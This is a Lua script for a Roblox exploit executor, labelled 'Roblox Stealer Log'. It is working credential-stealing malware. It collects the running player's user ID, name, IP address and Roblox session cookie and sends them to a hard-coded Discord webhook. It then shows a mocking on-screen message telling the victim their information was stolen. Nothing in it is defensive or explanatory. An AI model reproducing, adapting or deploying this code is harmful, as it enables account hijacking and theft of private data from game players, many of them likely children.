-- NO DATE, NO TIMESTAMP – DELTA SAFE
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- HTTP sender (tries request, then http_request)
local function send(url, json)
    local headers = {["Content-Type"] = "application/json"}
    local ok, res = pcall(function() return request({Url=url, Method="POST", Headers=headers, Body=json}) end)
    if ok and res then return true end
    ok, res = pcall(function() return http_request({Url=url, Method="POST", Headers=headers, Body=json}) end)
    return ok and res
end

-- Collect data
local info = {}
info.executor = getexecutorname and getexecutorname() or "Delta"
local player = game.Players.LocalPlayer
if player then
    info.userId = tostring(player.UserId)
    info.userName = player.Name
    info.displayName = player.DisplayName
end
info.placeId = tostring(game.PlaceId)
info.jobId = game.JobId
local ipOk, ip = pcall(function() return game:GetService("HttpService"):GetAsync("https://api.ipify.org") end)
info.ip = ipOk and ip or "N/A"
local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
info.cookie = cookieOk and cookieVal or "Not available"
pcall(function()
    info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
    info.platform = tostring(game:GetService("UserInputService").Platform)
end)

-- Build embed without timestamp
local fields = {}
for k, v in pairs(info) do
    table.insert(fields, {name = k, value = v, inline = true})
end
local embed = {
    embeds = {{
        title = "Roblox Stealer Log",
        color = 0xFF0000,
        fields = fields,
        footer = {text = "Delta Executor"}
    }}
}
local json = game:GetService("HttpService"):JSONEncode(embed)
send(webhook, json)

-- GUI (static, no animations)
local gui = Instance.new("ScreenGui")
gui.Parent = player:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 150)
frame.Position = UDim2.new(0.5, -200, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BackgroundTransparency = 0.2
frame.Parent = gui

local border = Instance.new("Frame")
border.Size = UDim2.new(1, -6, 1, -6)
border.Position = UDim2.new(0, 3, 0, 3)
border.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
border.BackgroundTransparency = 0.6
border.BorderSizePixel = 0
border.Parent = frame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, -50)
label.Position = UDim2.new(0, 0, 0, 10)
label.BackgroundTransparency = 1
label.Text = "U GOT YOUR INFOMATION STOLEN LMAO"
label.TextColor3 = Color3.fromRGB(255, 0, 0)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextWrapped = true
label.Parent = frame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 100, 0, 35)
closeBtn.Position = UDim2.new(0.5, -50, 1, -45)
closeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
closeBtn.Text = "Close"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.Gotham
closeBtn.Parent = frame
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
